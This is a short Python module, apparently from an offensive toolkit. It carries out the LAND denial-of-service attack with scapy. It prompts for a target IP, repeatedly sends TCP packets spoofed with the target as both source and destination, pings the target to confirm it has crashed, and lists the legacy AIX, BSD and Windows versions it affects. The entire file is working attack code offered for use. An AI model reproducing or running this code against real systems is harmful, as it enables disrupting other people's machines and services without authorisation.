from scapy.all import *
from util import Msg, Error
import commands

#
# Module exploits the Windows LAND attack.  This DoS essentially sends a packet with the source and destination
# as the target host, so it will send itself packets infinitely until crash.
# Original cvs here: http://insecure.org/sploits/land.ip.DOS.html
#
def initialize():
	# supress scapy output
	conf.verb = 0

	try:
		ip = raw_input('[!] Enter IP to DoS: ')
		tmp = raw_input('[!] LAND attack at ip %s.  Is this correct? '%ip)
		if tmp == 'n':
			return
		while True:
			print '[!] DoSing %s...'%ip
			send(IP(src=ip,dst=ip)/TCP(sport=134, dport=134))
			print '[!] Checking target..'
			rval = commands.getoutput('ping -c 1 -w 1 %s'%ip)
			up = re.search("\d.*? received", rval)
			if re.search('0', up.group(0)) is None:
				Msg('Host appears to still be up.')
				try:
					tmp = raw_input('[!] Try again? ')
				except Exception:
					break
				if tmp == 'n':
					break
			else:
				Msg('Host not responding!')
				break
	except Exception, j:
		Error('Error: %s'%j)
		return
#
#
#
def info():
	print '''[!] LAND DOS ATTACK
	      [systems]: AIX 3
		  			 BSDI 2.0-2.1
					 FreeBSD 2.2.5
					 Windows 95-Windows NT + SP3
		  '''	
